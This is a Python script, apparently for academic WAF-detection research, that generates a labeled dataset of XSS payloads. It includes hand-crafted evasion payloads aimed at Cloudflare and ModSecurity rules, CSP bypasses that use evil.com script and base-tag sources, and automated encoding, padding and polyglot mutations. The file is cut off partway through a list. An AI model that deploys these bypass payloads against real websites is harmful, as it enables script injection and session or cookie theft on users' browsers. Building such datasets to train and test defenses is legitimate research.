#!/usr/bin/env python3
"""
Extended XSS Payload Generator for Academic Research
======================================================
Generates 500+ diverse XSS payloads with encoding mutations,
combining manual expert payloads with automated encoding permutations.
Also merges payloads from senior thesis datasets.

Outputs:
  1. xss_payloads_raw.txt        - one payload per line
  2. xss_dataset_labeled.json    - fully labeled dataset

Usage: python generate_xss_payloads_extended.py
Requirements: Python 3.7+ (standard library only)
"""

import json
import base64
import os
import urllib.parse
import csv
import random
import hashlib

random.seed(42)
OUTPUT_DIR = os.path.dirname(os.path.abspath(__file__))

payloads_data = []
seen_hashes = set()
_id_counter = [0]


def add(payload, encoding_type, scenario, target_context, waf_bypass, label, reason):
    h = hashlib.md5(payload.encode('utf-8', errors='replace')).hexdigest()
    if h in seen_hashes:
        return
    seen_hashes.add(h)
    _id_counter[0] += 1
    payloads_data.append({
        "id": _id_counter[0],
        "scenario": scenario,
        "payload": payload,
        "encoding_type": encoding_type,
        "target_context": target_context,
        "waf_bypass": waf_bypass,
        "label": label,
        "reason": reason
    })


# ============================================================================
# SECTION 1: CORE EXPERT PAYLOADS (manually crafted)
# ============================================================================

# --- 1a. Raw / Unencoded ---
raw_valid = [
    ("<details open ontoggle=alert(1)>", "ontoggle on details is less commonly in WAF rulesets."),
    ("<marquee onstart=alert(1)>", "marquee/onstart is a lesser-known event handler."),
    ("<math><mtext><table><mglyph><style><!--</style><img title=\"-->&lt;img src=x onerror=alert(1)&gt;\">",
     "HTML parser differential between math/foreign content confuses WAF."),
    ("<video src=x onerror=alert(1)>", "video/onerror is less commonly in WAF rulesets."),
    ("<audio src=x onerror=alert(1)>", "audio/onerror may not be in managed rule signatures."),
    ("<select onfocus=alert(1) autofocus>", "select/onfocus with autofocus is less commonly blocked."),
    ("<body/onhashchange=alert(1)><a href=#>click", "onhashchange is less commonly covered by WAF."),
    ("<svg><animate onbegin=alert(1) attributeName=x dur=1s>", "SVG animate onbegin is exotic."),
    ("<svg><set onbegin=alert(1) attributename=x to=1>", "SVG set onbegin is rarely blocked."),
    ("<x/onclick=alert(1)>click", "Custom elements support global event handlers; WAF may miss."),
    ("<img/src=`x`onerror=alert(1)>", "Backtick delimiter confuses WAF parsers."),
    ("<svg><desc><template><svg onload=alert(1)>", "Nested SVG contexts create parsing confusion."),
]
raw_invalid = [
    ("<script>alert('xss')</script>", "Classic script tag blocked by WAF signature rules."),
    ("<img src=x onerror=alert(1)>", "Standard img/onerror is a well-known WAF signature."),
    ("<svg/onload=alert(1)>", "svg/onload is a common WAF rule target."),
    ("<body onload=alert('xss')>", "Body onload handler is flagged by WAF."),
    ("<input onfocus=alert(1) autofocus>", "input/onfocus autofocus is now a known vector; WAF blocks it."),
    ("<script>alert(1)</script>", "Unobfuscated script tag is the most basic WAF signature."),
    ("<iframe src=\"javascript:alert(1)\"></iframe>", "iframe javascript: src is a core WAF rule."),
    ("<script>onerror=alert;throw 1</script>", "Outer script tag caught by WAF."),
    ("<keygen onfocus=alert(1) autofocus>", "keygen is deprecated/removed from modern browsers."),
    ("<img src=x onerror=alert(1) data-custom='test'>", "Standard img/onerror still caught by WAF."),
    ("<<script>alert(1)//<</script>", "Double bracket creates malformed HTML."),
    ("<math><mi//teleport=alert(1) xmlns=\"http://www.w3.org/1998/Math/MathML\">",
     "teleport is not a valid event handler."),
]
for p, r in raw_valid:
    add(p, "Raw", "反射型XSS", "HTML attribute", True, "valid", r)
for p, r in raw_invalid:
    add(p, "Raw", "反射型XSS", "HTML attribute", False, "invalid", r)

# --- 1b. DOM-based ---
dom_valid = [
    ("';document.location='javascript:alert(1)'//", "Breaks out of JS string; WAF misses DOM context."),
    ("'-alert(1)-'", "Minimal JS injection using arithmetic; no HTML tags."),
    ("\";alert(1)//", "Breaks out of double-quoted string in script."),
    ("document.write('<img src=x onerror=alert(1)>')", "document.write inside script block; WAF inspects params not DOM."),
    ("window['al'+'ert'](document.domain)", "String concat bypasses WAF keyword detection."),
    ("location.href='javascript:alert(1)'", "location.href assignment; no HTML tags."),
    ("setTimeout('ale'+'rt(1)',0)", "setTimeout with split keyword."),
    ("';var x=new Function('al'+'ert(1)');x()//", "Function constructor with concat."),
    ("eval?.('alert(1)')", "Optional chaining with eval; newer syntax."),
    ("this[`al`+`ert`](1)", "Template literal concat with this[]."),
    ("self['\\x61lert'](1)", "Hex escape in bracket notation."),
    ("Reflect.apply(alert,window,[1])", "Reflect.apply to invoke alert indirectly."),
    ("navigator['__proto__']['constructor']['constructor']('alert(1)')()", "Prototype chain to Function constructor."),
    ("crypto.subtle||alert(1)", "Short-circuit evaluation trick."),
    ("[].constructor.constructor('alert(1)')()", "Array constructor chain to eval."),
]
dom_invalid = [
    ("javascript:void(document.cookie='xss=1')", "javascript: in URL bar blocked by modern browsers."),
    ("';alert(document.domain)//", "JS breakout in HTML attribute context renders as text."),
    ("<script>var x=1</script>", "Valid script but no harmful action; also blocked by WAF tag rule."),
]
for p, r in dom_valid:
    add(p, "DOM-based", "DOM-based XSS", "script block", True, "valid", r)
for p, r in dom_invalid:
    add(p, "DOM-based", "DOM-based XSS", "script block", False, "invalid", r)

# --- 1c. Cloudflare-specific bypass techniques ---
cf_valid = [
    ("<ScRiPt>alert(1)</ScRiPt>", False, "invalid", "Cloudflare WAF performs case-insensitive matching."),
    ("<iMg SrC=x OnErRoR=aLeRt(1)>", False, "invalid", "Cloudflare normalizes case before matching."),
    ("<DeTaIlS oPeN oNtOgGlE=alert(1)>", True, "valid", "ontoggle with mixed case may bypass."),
    ("<SvG/OnLoAd=prompt(1)>", True, "valid", "prompt() with mixed case avoids alert keyword rule."),
    ("<MARQUEE ONSTART=confirm(1)>", True, "valid", "confirm() with uppercase marquee may bypass."),
    ("<SCRIPT>ALERT(1)</SCRIPT>", False, "invalid", "Fully uppercase still matched."),
    ("<ScRiPt SrC=//evil.com/x.js></ScRiPt>", False, "invalid", "Script src is core WAF signature."),
    ("<img\tsrc=x\tonerror=alert(1)>", True, "valid", "Tab chars may not be normalized by WAF regex."),
    ("<img\nsrc=x\nonerror=alert(1)>", True, "valid", "Newlines break single-line regex patterns."),
    ("<img\r\nsrc=x\r\nonerror=alert(1)>", True, "valid", "CRLF breaks WAF pattern matching."),
    ("<svg\u200Bonload=alert(1)>", False, "invalid", "Zero-width space is not valid HTML whitespace."),
    ("<img src=x onerror\u200B=alert(1)>", False, "invalid", "ZWS in attribute name breaks recognition."),
    ("<scr\u200Bipt>alert(1)</scr\u200Bipt>", False, "invalid", "ZWS inside tag name creates unrecognized tag."),
    ("</title><script>alert(1)</script>", True, "valid", "Context-breaking injection closes <title>."),
    ("</textarea><svg onload=alert(1)>", True, "valid", "Breaks out of textarea."),
    ("</style><img src=x onerror=alert(1)>", True, "valid", "Closes style block to break into HTML."),
    ("--><script>alert(1)</script><!--", True, "valid", "Closing HTML comment then injecting."),
    ("*/alert(1)/*", True, "valid", "Closing JS multi-line comment."),
    ("<svg/onload=\"prompt`1`\">", True, "valid", "Template literal avoids parentheses WAF rules."),
    ("<img src=x onerror=window['alert'](1)>", True, "valid", "Bracket notation avoids direct call."),
    ("<img src=x onerror=self['ale'+'rt'](1)>", True, "valid", "String concat reconstructs alert."),
    ("<img src=x onerror=top[`al`+`ert`](1)>", True, "valid", "Template concat with top[]."),
    ("<img src=x onerror=Function('ale'+'rt(1)')()>", True, "valid", "Function constructor with split."),
    ("<img src=x onerror=eval?.('alert(1)')>", True, "valid", "Optional chaining with eval."),
    ("java\tscript:alert(1)", False, "invalid", "Tab in protocol keyword breaks recognition."),
]
for item in cf_valid:
    p, bypass, lbl, r = item
    add(p, "Cloudflare Bypass", "Cloudflare WAF繞過", "HTML attribute", bypass, lbl, r)

# --- 1d. CSP bypass scenarios ---
csp_entries = [
    ("<script nonce=abc>alert(1)</script>", False, "invalid", "Guessed nonce extremely unlikely to match."),
    ("<base href='https://evil.com/'>", True, "valid", "base tag changes relative script sources."),
    ("<script src='https://evil.com/xss.js'></script>", False, "invalid", "CSP blocks unauthorized domain."),
    ("<link rel=import href='https://evil.com/xss.html'>", False, "invalid", "HTML imports deprecated."),
    ("<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>", False, "invalid", "javascript: in meta refresh blocked by modern browsers."),
]
for p, bypass, lbl, r in csp_entries:
    add(p, "CSP Bypass", "CSP繞過", "HTML attribute", bypass, lbl, r)


# ============================================================================
# SECTION 2: AUTOMATED ENCODING PERMUTATIONS
# ============================================================================

# Base payloads to apply encoding transformations to
base_payloads = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<marquee onstart=alert(1)>",
    "<body onload=alert(1)>",
    "<input onfocus=alert(1) autofocus>",
    "<a href=javascript:alert(1)>click</a>",
    "<iframe src=javascript:alert(1)>",
    "<video src=x onerror=alert(1)>",
    "<audio src=x onerror=alert(1)>",
    "<select onfocus=alert(1) autofocus>",
    "<svg><animate onbegin=alert(1) attributeName=x>",
    "<img src=x onerror=prompt(1)>",
    "<img src=x onerror=confirm(1)>",
    "<div onmouseover=alert(1)>hover</div>",
    "<form onsubmit=alert(1)><button>click</button></form>",
    "<object data=javascript:alert(1)>",
    "<embed src=javascript:alert(1)>",
]

# Lesser-known event handler payloads (more likely to bypass WAF)
exotic_payloads = [
    "<details open ontoggle=alert(1)>",
    "<marquee onstart=alert(1)>",
    "<video src=x onerror=alert(1)>",
    "<audio src=x onerror=alert(1)>",
    "<select onfocus=alert(1) autofocus>",
    "<svg><animate onbegin=alert(1) attributeName=x>",
    "<svg><set onbegin=alert(1) attributename=x to=1>",
    "<body/onhashchange=alert(1)><a href=#>click",
    "<x/onclick=alert(1)>click",
]

# Well-known payloads (WAF likely catches even with encoding)
common_payloads = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<body onload=alert(1)>",
    "<input onfocus=alert(1) autofocus>",
    "<iframe src=javascript:alert(1)>",
]


def url_encode(s):
    return urllib.parse.quote(s, safe='')


def double_url_encode(s):
    return urllib.parse.quote(urllib.parse.quote(s, safe=''), safe='')


def html_entity_encode(s):
    return ''.join(f'&#{ord(c)};' for c in s)


def html_hex_entity_encode(s):
    return ''.join(f'&#x{ord(c):X};' for c in s)


def unicode_escape(s):
    return ''.join(f'\\u{ord(c):04x}' for c in s)


def hex_escape(s):
    return ''.join(f'\\x{ord(c):02x}' for c in s)


def mixed_case(s):
    result = []
    for i, c in enumerate(s):
        result.append(c.upper() if i % 2 == 0 else c.lower())
    return ''.join(result)


def insert_tabs(s):
    return s.replace(' ', '\t')


def insert_newlines(s):
    return s.replace(' ', '\n')


def null_byte_insert(s):
    """Insert null bytes inside tag names"""
    return s.replace('<script>', '<scr\x00ipt>').replace('</script>', '</scr\x00ipt>')


# 2a. URL Encoding permutations
for p in base_payloads:
    encoded = url_encode(p)
    is_exotic = p in exotic_payloads
    if p in common_payloads:
        add(encoded, "URL Encoding", "反射型XSS", "URL parameter", False, "invalid",
            "Single URL encoding decoded by WAF normalization layer; common pattern detected.")
    else:
        add(encoded, "URL Encoding", "反射型XSS", "URL parameter", is_exotic, "valid" if is_exotic else "invalid",
            f"URL-encoded payload; {'exotic handler may bypass WAF' if is_exotic else 'WAF likely decodes and detects'}.")

# 2b. Double URL Encoding permutations
for p in base_payloads:
    encoded = double_url_encode(p)
    is_exotic = p in exotic_payloads
    add(encoded, "Double Encoding", "反射型XSS", "URL parameter",
        True if is_exotic else False,
        "valid" if is_exotic else "invalid",
        f"Double URL encoding; {'WAF decodes once, app decodes again, exotic handler bypasses' if is_exotic else 'may still be detected after normalization'}.")

# 2c. HTML Entity Encoding (decimal) permutations
for p in base_payloads[:10]:
    encoded = html_entity_encode(p)
    add(encoded, "HTML Entity Encoding", "儲存型XSS", "innerHTML",
        True, "valid",
        "HTML entities decoded by browser before innerHTML rendering; WAF inspects raw entities.")
    add(encoded, "HTML Entity Encoding", "反射型XSS", "HTML attribute",
        False, "invalid",
        "HTML entities in non-innerHTML context render as text, not as HTML elements.")

# 2d. HTML Hex Entity Encoding permutations
for p in base_payloads[:8]:
    encoded = html_hex_entity_encode(p)
    add(encoded, "HTML Hex Entity Encoding", "DOM-based XSS", "innerHTML",
        True, "valid",
        "Hex HTML entities decoded by browser in innerHTML context; bypasses WAF text matching.")

# 2e. Unicode Escape permutations (for JS event handler context)
alert_variants = [
    ("alert", "\\u0061\\u006c\\u0065\\u0072\\u0074"),
    ("prompt", "\\u0070\\u0072\\u006f\\u006d\\u0070\\u0074"),
    ("confirm", "\\u0063\\u006f\\u006e\\u0066\\u0069\\u0072\\u006d"),
]
html_tags_for_unicode = [
    "<img src=x onerror={fn}(1)>",
    "<svg onload={fn}(1)>",
    "<details open ontoggle={fn}(1)>",
    "<video src=x onerror={fn}(1)>",
    "<marquee onstart={fn}(1)>",
    "<body onload={fn}(1)>",
]
for tag_tmpl in html_tags_for_unicode:
    for fn_name, fn_unicode in alert_variants:
        payload = tag_tmpl.replace("{fn}", fn_unicode)
        is_exotic = "details" in tag_tmpl or "video" in tag_tmpl or "marquee" in tag_tmpl
        add(payload, "Unicode Encoding", "反射型XSS", "HTML attribute",
            True, "valid",
            f"Unicode escapes in event handler decoded by JS engine; WAF misses '{fn_name}' keyword.")

# Unicode escape for whole tags (invalid - browsers don't decode \uXXXX in HTML)
for p in base_payloads[:5]:
    encoded = unicode_escape(p)
    add(encoded, "Unicode Encoding", "反射型XSS", "URL parameter",
        False, "invalid",
        "Unicode-escaped angle brackets are NOT decoded in HTML context; remains inert text.")

# 2f. Hex Escape permutations (JS context)
hex_tags = [
    "<img src=x onerror=\"{fn}(1)\">",
    "<svg onload=\"{fn}(1)\">",
    "<details open ontoggle=\"{fn}(1)\">",
]
for tag_tmpl in hex_tags:
    fn_hex = hex_escape("alert")
    payload = tag_tmpl.replace("{fn}", fn_hex)
    add(payload, "Hex Encoding", "反射型XSS", "HTML attribute",
        True, "valid",
        "Hex escapes (\\x61) valid in JS contexts within event handlers; WAF doesn't decode JS hex.")

# 2g. Base64 Encoding permutations
b64_fns = [
    ("alert(1)", base64.b64encode(b"alert(1)").decode()),
    ("alert(document.domain)", base64.b64encode(b"alert(document.domain)").decode()),
    ("alert(document.cookie)", base64.b64encode(b"alert(document.cookie)").decode()),
    ("prompt(1)", base64.b64encode(b"prompt(1)").decode()),
    ("confirm(1)", base64.b64encode(b"confirm(1)").decode()),
]

b64_carriers_valid = [
    "<img src=x onerror=eval(atob('{b64}'))>",
    "<svg onload=eval(atob('{b64}'))>",
    "<details open ontoggle=eval(atob('{b64}'))>",
    "<video src=x onerror=eval(atob('{b64}'))>",
]
b64_carriers_invalid = [
    "<script>eval(atob('{b64}'))</script>",
]

for fn_plain, fn_b64 in b64_fns:
    for carrier in b64_carriers_valid:
        payload = carrier.replace("{b64}", fn_b64)
        add(payload, "Base64 Encoding", "反射型XSS", "HTML attribute",
            True, "valid",
            f"Base64-wrapped {fn_plain} hides function name from WAF; eval(atob()) decodes at runtime.")
    for carrier in b64_carriers_invalid:
        payload = carrier.replace("{b64}", fn_b64)
        add(payload, "Base64 Encoding", "反射型XSS", "script block",
            False, "invalid",
            "Outer <script> tag detected by WAF regardless of Base64 content inside.")

# data: URI payloads
for fn_plain, fn_b64 in b64_fns[:3]:
    html_content = f"<script>{fn_plain}</script>"
    b64_html = base64.b64encode(html_content.encode()).decode()
    add(f"<iframe src=\"data:text/html;base64,{b64_html}\">",
        "Base64 Encoding", "反射型XSS", "HTML attribute",
        True, "valid",
        "data: URI with Base64 HTML; WAF cannot decode data URIs inline.")
    add(f"<object data=\"data:text/html;base64,{b64_html}\">",
        "Base64 Encoding", "儲存型XSS", "HTML attribute",
        True, "valid",
        "object with data: URI; executes if no CSP restricts data: sources.")

# 2h. Mixed Case permutations
for p in base_payloads:
    mc = mixed_case(p)
    if p in common_payloads:
        add(mc, "Mixed Case", "Cloudflare WAF繞過", "HTML attribute",
            False, "invalid",
            "Cloudflare WAF performs case-insensitive matching; mixed case still caught.")
    else:
        add(mc, "Mixed Case", "Cloudflare WAF繞過", "HTML attribute",
            True, "valid",
            "Mixed case with exotic handler may bypass case-insensitive rules that don't cover this handler.")

# 2i. Tab/newline insertion
for p in exotic_payloads[:5]:
    tab_p = insert_tabs(p)
    add(tab_p, "Whitespace Insertion", "Cloudflare WAF繞過", "HTML attribute",
        True, "valid",
        "Tab characters between attributes are valid HTML whitespace but may break WAF regex.")
    nl_p = insert_newlines(p)
    add(nl_p, "Whitespace Insertion", "Cloudflare WAF繞過", "HTML attribute",
        True, "valid",
        "Newline chars between attributes break WAF single-line regex patterns.")

# 2j. Mixed Encoding combinations
mixed_combos = [
    ("%3Cscr%69pt%3E&#97;lert(1)%3C/scr%69pt%3E",
     True, "valid", "URL + HTML entity mixing confuses WAF normalization."),
    ("<img src=x onerror=\"&#97;l\\u0065rt(1)\">",
     True, "valid", "HTML entity + Unicode escape decoded by different parsers."),
    ("<svg/onload=&#97;&#108;&#101;&#114;&#116;(1)>",
     True, "valid", "HTML entities in event handler decoded before JS execution."),
    ("%3Csvg%2Fonload%3D%26%2397%3Blert(1)%3E",
     True, "valid", "URL-encoded structure + HTML entity for 'a'."),
    ("<scr%00ipt>alert(1)</scr%00ipt>",
     False, "invalid", "Null byte in tag name rejected by modern browsers."),
    ("<%73cript>al\\u0065rt(1)</%73cript>",
     False, "invalid", "URL-encoded char in tag name not decoded in tag context."),
    ("<img%20src%3Dx%20onerror%3D%26%2397%3Blert(1)>",
     True, "valid", "URL-encoded attribute separators with HTML entity function name."),
    ("%3Cdetails%20open%20ontoggle%3D%26%23112%3Brompt(1)%3E",
     True, "valid", "URL-encoded exotic tag + HTML entity for prompt first char."),
]
for p, bypass, lbl, r in mixed_combos:
    add(p, "Mixed Encoding", "反射型XSS", "URL parameter" if "%" in p[:5] else "HTML attribute",
        bypass, lbl, r)

# 2k. Segmented injection (context-breaking) with more variants
segmented = [
    ("</title><img src=x onerror=alert(1)>", True, "valid"),
    ("</textarea><img src=x onerror=alert(1)>", True, "valid"),
    ("</style><svg onload=alert(1)>", True, "valid"),
    ("</script><script>alert(1)</script>", True, "valid"),
    ("</noscript><img src=x onerror=alert(1)>", True, "valid"),
    ("</option><img src=x onerror=alert(1)>", True, "valid"),
    ("</select><img src=x onerror=alert(1)>", True, "valid"),
    ("</template><img src=x onerror=alert(1)>", True, "valid"),
    ("\"><img src=x onerror=alert(1)>", True, "valid"),
    ("'><img src=x onerror=alert(1)>", True, "valid"),
    ("\"><svg onload=alert(1)>", True, "valid"),
    ("'><svg onload=alert(1)>", True, "valid"),
]
for p, bypass, lbl in segmented:
    add(p, "Segmented Injection", "Cloudflare WAF繞過", "HTML attribute",
        bypass, lbl,
        "Context-breaking injection escapes enclosing element; WAF may not detect context switch.")

# 2l. JavaScript protocol variations
js_proto = [
    ("javascript:alert(1)", True, "valid", "HTML attribute"),
    ("javascript:prompt(1)", True, "valid", "HTML attribute"),
    ("javascript:confirm(1)", True, "valid", "HTML attribute"),
    ("javascript:void(alert(1))", True, "valid", "HTML attribute"),
    ("javascript:alert`1`", True, "valid", "HTML attribute"),
    ("JAvasCRIpt:alert(1)", True, "valid", "HTML attribute"),
    ("java\nscript:alert(1)", False, "invalid", "HTML attribute"),
    ("java\rscript:alert(1)", False, "invalid", "HTML attribute"),
    ("java\tscript:alert(1)", False, "invalid", "HTML attribute"),
    ("&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:alert(1)",
     True, "valid", "HTML attribute"),
    ("&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(1)",
     True, "valid", "HTML attribute"),
    ("javascript:\\u0061\\u006c\\u0065\\u0072\\u0074(1)",
     True, "valid", "HTML attribute"),
]
for p, bypass, lbl, ctx in js_proto:
    reason = "javascript: protocol " + ("with encoding bypasses WAF keyword detection." if bypass else "with inserted whitespace breaks protocol recognition.")
    add(p, "JavaScript Protocol", "反射型XSS", ctx, bypass, lbl, reason)

# 2m. Advanced JS obfuscation in event handlers
js_obfuscation = [
    ("<img src=x onerror=window['alert'](1)>", True, "valid", "Bracket notation avoids direct call."),
    ("<img src=x onerror=self['ale'+'rt'](1)>", True, "valid", "String concat in bracket notation."),
    ("<img src=x onerror=top[`al`+`ert`](1)>", True, "valid", "Template concat."),
    ("<img src=x onerror=Function('ale'+'rt(1)')()>", True, "valid", "Function constructor."),
    ("<img src=x onerror=[].constructor.constructor('alert(1)')()>", True, "valid", "Array constructor chain."),
    ("<img src=x onerror=Reflect.apply(alert,window,[1])>", True, "valid", "Reflect.apply indirect call."),
    ("<img src=x onerror=setTimeout`alert\\x281\\x29`>", True, "valid", "Tagged template with hex."),
    ("<img src=x onerror=location='javascript:alert(1)'>", True, "valid", "Location assignment."),
    ("<img src=x onerror=name='alert(1)';eval(name)>", True, "valid", "window.name as eval vector."),
    ("<img src=x onerror=with(document)body.appendChild(createElement('script')).text='alert(1)'>",
     True, "valid", "DOM manipulation in event handler."),
    ("<svg onload=alert&lpar;1&rpar;>", True, "valid", "HTML entities for parentheses in SVG."),
    ("<img src=x onerror=alert(String.fromCharCode(49))>", True, "valid", "fromCharCode hides argument."),
    ("<img src=x onerror=alert(/xss/.source)>", True, "valid", "RegExp source property."),
    ("<img src=x onerror=throw~delete~alert(1)>", True, "valid", "Unusual JS syntax with throw/delete."),
    ("<img src=x onerror=alert(1)//", True, "valid", "Missing closing bracket; browser still fires."),
]
for p, bypass, lbl, r in js_obfuscation:
    add(p, "JS Obfuscation", "Cloudflare WAF繞過", "HTML attribute", bypass, lbl, r)

# 2n. Polyglot payloads
polyglots = [
    ("javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'",
     True, "valid", "Multi-context polyglot evades pattern-based WAF."),
    ("jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */onerror=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(1)//>",
     True, "valid", "Complex polyglot with multiple nested contexts."),
    ("\"><img src=x id=alert(1) onerror=eval(id)>",
     True, "valid", "Uses id attribute as eval source; indirect execution."),
    ("'\"--></style></script><svg/onload=alert(1)>",
     True, "valid", "Closes multiple contexts before SVG injection."),
    ("<svg/onload=alert(1)//", True, "valid", "SVG with JS comment truncation."),
]
for p, bypass, lbl, r in polyglots:
    add(p, "Polyglot", "Cloudflare WAF繞過", "HTML attribute", bypass, lbl, r)

# ============================================================================
# SECTION 2.5: ADVANCED EVASION TECHNIQUES (TARGETING MODSEC PARANOIA 2)
# ============================================================================

# 2o. Overlapping/Multiple Encodings
multiple_encodings = [
    # URL encode + Double URL encode mix
    ("%25%33%43%25%37%33%25%36%33%25%37%32%25%36%39%25%37%30%25%37%34%25%33%45alert(1)%25%33%43%25%32%46%25%37%33%25%36%33%25%37%32%25%36%39%25%37%30%25%37%34%25%33%45", True, "valid", "Mixed URL and Double URL encoding for <script> tags."),
    
    # URL encoded HTML entities (browser decodes URL -> HTML parser decodes entity)
    ("%3Cimg%20src%3Dx%20onerror%3D%26%23x61%3B%26%23x6c%3B%26%23x65%3B%26%23x72%3B%26%23x74%3B%281%29%3E", True, "valid", "URL encoded HTML Hex entities for 'alert'."),
    
    # URL encoded JS Hex/Unicode inside HTML attribute
    ("%3Cdetails%20open%20ontoggle%3D%5C%75%30%30%36%31%5C%75%30%30%36%63%5C%75%30%30%36%35%5C%75%30%30%37%32%5C%75%30%30%37%34%281%29%3E", True, "valid", "URL encoded Unicode escapes in event handler."),
]
for p, bypass, lbl, r in multiple_encodings:
    add(p, "Advanced Evasion", "ModSec CRS繞過", "URL parameter", bypass, lbl, r)

# 2p. Junk padding and extreme spacing 
# WAFs often have a match limit or give up parsing after X characters.
long_padding = "A" * 8000
junk_padding_payloads = [
    # Pad at the end of the tag
    (f"<img src=x onerror=alert(1) {long_padding}=\"x\">", True, "valid", "8KB of junk attribute at the end of the tag."),
    
    # Pad before the event handler
    (f"<img src=x {long_padding}=\"x\" onerror=alert(1)>", True, "valid", "8KB of junk attribute before event handler to push it out of WAF inspection buffer."),
    
    # Extreme spacing in JS
    (f"<img src=x onerror={' ' * 2000}alert(1)>", True, "valid", "2000 spaces inside event handler before payload execution."),
    
    # Extreme JS comment padding
    (f"<img src=x onerror=/*{long_padding}*/alert(1)>", True, "valid", "8KB of multi-line comment before execution."),
]
for p, bypass, lbl, r in junk_padding_payloads:
    add(p, "Padding Injection", "ModSec CRS繞過", "HTML attribute", bypass, lbl, r)

# 2q. Unusual HTML syntaxes
unusual_html = [
    ("<img/src=x/onerror=alert(1)>", True, "valid", "Multiple slashes instead of spaces."),
    ("<img src=x onerror=alert(1)////>", True, "valid", "Multiple trailing slashes."),
    ("<img src=x onerror\x09=alert(1)>", True, "valid", "Tab space before equal sign in attribute."),
    ("<img src=x onerror=\x0balert(1)>", True, "valid", "Vertical tab (VT) after equal sign in attribute."),
    ("<img src=x onerror=\x0calert(1)>", True, "valid", "Form feed (FF) after equal sign in attribute."),
    ("<div/onmouseover='alert(1)'>X</div>", True, "valid", "Slash after tag name with single quotes."),
    ("<svg o&#x6E;load=alert(1)>", True, "valid", "HTML entity masking the 'on' prefix of event hander."),
]
for p, bypass, lbl, r in unusual_html:
    add(p, "Unusual Syntax", "ModSec CRS繞過", "HTML attribute", bypass, lbl, r)

# 2r. Deep DOM Evasion (Exploiting DOM Clobbering / specific sinks)
dom_evasion = [
    ("<form id=test><button id=x></button></form><script>alert(test.x.id)</script>", True, "valid", "DOM Clobbering technique - perfectly valid HTML structure doing malicious execution."),
    ("<a id=v></a><script>v.href='javascript:alert(1)';v.click()</script>", True, "valid", "DOM specific API manipulation, hiding 'javascript:' from typical attribute detectors."),
    ("<object id=x><param name=x></object><script>alert(x.x)</script>", True, "valid", "DOM clobbering via object param."),
]
for p, bypass, lbl, r in dom_evasion:
    add(p, "DOM Evasion", "DOM-based XSS", "HTML attribute", bypass, lbl, r)


# ============================================================================
# SECTION 3: IMPORT THESIS PAYLOADS
# ============================================================================

# PortSwigger payloads
portswigger_path = os.path.join(OUTPUT_DIR,
    "學長碩論完整資料-20260323T145304Z-1-001", "學長碩論完整資料", "XSSpayloadFromPortSwigger.csv")

if os.path.exists(portswigger_path):
    try:
        with open(portswigger_path, 'r', encoding='utf-8') as f:
            reader = csv.reader(f)
            header = next(reader, None)
            for row in reader:
                if len(row) >= 2:
                    payload_text = row[0].strip()
                    label_val = row[1].strip()
                    if payload_text and len(payload_text) > 3:
                        is_malicious = label_val == '1'
                        add(payload_text,
                            "PortSwigger Dataset",
                            "反射型XSS" if is_malicious else "反射型XSS",
                            "HTML attribute",
                            is_malicious,
                            "valid" if is_malicious else "invalid",
                            f"PortSwigger {'XSS payload' if is_malicious else 'benign sample'} from thesis dataset.")
    except Exception as e:
        print(f"Warning: Could not load PortSwigger dataset: {e}")

# HttpParams XSS payloads
httpparams_path = os.path.join(OUTPUT_DIR,
    "學長碩論完整資料-20260323T145304Z-1-001", "學長碩論完整資料",
    "TrainingData", "DataSetOfHttpParamsDataset", "payload_full.csv")

if os.path.exists(httpparams_path):
    try:
        with open(httpparams_path, 'r', encoding='utf-8') as f:
            reader = csv.reader(f)
            header = next(reader, None)
            xss_rows = []
            norm_rows = []
            for row in reader:
                if len(row) >= 4:
                    if row[2].strip() == 'xss':
                        xss_rows.append(row)
                    elif row[2].strip() == 'norm' and len(norm_rows) < 200:
                        norm_rows.append(row)

            # Add all XSS payloads
            for row in xss_rows:
                payload_text = row[0].strip()
                if payload_text and len(payload_text) > 3:
                    add(payload_text,
                        "HttpParams Dataset",
                        "反射型XSS",
                        "URL parameter",
                        True,
                        "valid",
                        "XSS payload from HttpParams thesis training dataset.")

            # Add sample of normal payloads
            random.shuffle(norm_rows)
            for row in norm_rows[:100]:
                payload_text = row[0].strip()
                if payload_text and len(payload_text) > 1:
                    add(payload_text,
                        "HttpParams Dataset",
                        "反射型XSS",
                        "URL parameter",
                        False,
                        "invalid",
                        "Normal/benign sample from HttpParams thesis dataset; not an XSS payload.")
    except Exception as e:
        print(f"Warning: Could not load HttpParams dataset: {e}")


# ============================================================================
# SECTION 4: IMPORT EXTERNAL JSON PAYLOADS (DIVERSE VULNERABILITIES)
# ============================================================================

try:
    with open(os.path.join(OUTPUT_DIR, 'extra_payloads.json'), 'r', encoding='utf-8') as f:
        extra_data = json.load(f)
        
        # Process standard payloads
        if 'payloads' in extra_data:
            for category, data in extra_data['payloads'].items():
                for p in data.get('payloads', []):
                    add(p, category, f"Diverse JSON (Basic) - {category}", "Mixed", True, "valid", f"User JSON: {category}")
                for p in data.get('falsePayloads', []):
                    add(p, category, f"Diverse JSON (Basic) - {category}", "Mixed", False, "invalid", f"User JSON False: {category}")
        
        # Process advanced payloads
        if 'advancedPayloads' in extra_data:
            for category, data in extra_data['advancedPayloads'].items():
                for p in data.get('payloads', []):
                    add(p, category, f"Diverse JSON (Advanced) - {category}", "Mixed", True, "valid", f"User JSON: {category}")
                for p in data.get('falsePayloads', []):
                    add(p, category, f"Diverse JSON (Advanced) - {category}", "Mixed", False, "invalid", f"User JSON False: {category}")
                    
    print(f"[*] Imported external diverse JSON payloads.")
except Exception as e:
    print(f"[*] Warning: Could not load extra_payloads.json: {e}")

# ============================================================================
# SECTION 4.5: EXTREME PARANOIA WAF BYPASSES
# ============================================================================
extreme_bypasses = [
    # 1. JSFuck / Symbol-Only JS (No alphanumeric characters to bypass Regex matching words like 'alert')
